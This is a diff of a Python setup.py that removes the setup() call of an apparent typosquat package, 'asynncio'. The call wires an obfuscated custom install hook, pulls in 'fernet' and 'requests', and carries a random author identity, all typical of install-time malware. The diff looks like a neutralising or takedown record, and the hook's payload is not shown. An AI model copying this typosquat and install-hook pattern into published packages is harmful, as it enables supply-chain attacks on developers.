@@ -18,22 +18,5 @@ class MgOwGuAZoeRfJUapvKyINlqoEfYPIxualNKnlbZwylFtJpSUNQAxwKHBbQKipH(install):
             install.run(self)
 
 
-setup(
-    name="asynncio",
-    version=VERSION,
-    author="cUthzX",
-    author_email="CnTrs@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': MgOwGuAZoeRfJUapvKyINlqoEfYPIxualNKnlbZwylFtJpSUNQAxwKHBbQKipH,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
 
